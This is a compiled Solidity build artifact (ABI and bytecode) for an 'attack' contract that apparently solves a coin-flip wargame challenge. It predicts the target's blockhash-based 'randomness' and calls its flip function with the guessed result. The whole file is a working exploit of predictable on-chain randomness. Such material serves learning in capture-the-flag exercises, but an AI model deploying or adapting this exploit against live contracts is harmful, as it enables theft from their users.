{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"FACTOR","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052600160ff1b5f553480156015575f5ffd5b506040516102dc3803806102dc8339810160408190526032916056565b600180546001600160a01b0319166001600160a01b03929092169190911790556081565b5f602082840312156065575f5ffd5b81516001600160a01b0381168114607a575f5ffd5b9392505050565b61024e8061008e5f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063022ec0951461004357806335815b951461008d5780639e5faafc146100a3575b5f5ffd5b6001546100639073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff90911681526020015b60405180910390f35b6100955f5481565b604051908152602001610084565b6100ab6100bb565b6040519015158152602001610084565b5f806100c8600143610193565b5f805491409250906100da90836101cc565b90505f6100e86002836101df565b6001146100f5575f6100f8565b60015b6001546040517f1d263f670000000000000000000000000000000000000000000000000000000081528215600482015291925073ffffffffffffffffffffffffffffffffffffffff1690631d263f67906024016020604051808303815f875af1158015610167573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061018b91906101f2565b935050505090565b818103818111156101b257634e487b7160e01b5f52601160045260245ffd5b92915050565b634e487b7160e01b5f52601260045260245ffd5b5f826101da576101da6101b8565b500490565b5f826101ed576101ed6101b8565b500690565b5f60208284031215610202575f5ffd5b81518015158114610211575f5ffd5b939250505056fea26469706673582212200d6ed7c47d3c5b9fbc79fef84ce529afb6c0f2d8c1468439aecbcb6cca79d94e64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"FACTOR()":"35815b95","attack()":"9e5faafc","instance()":"022ec095"},"id":0}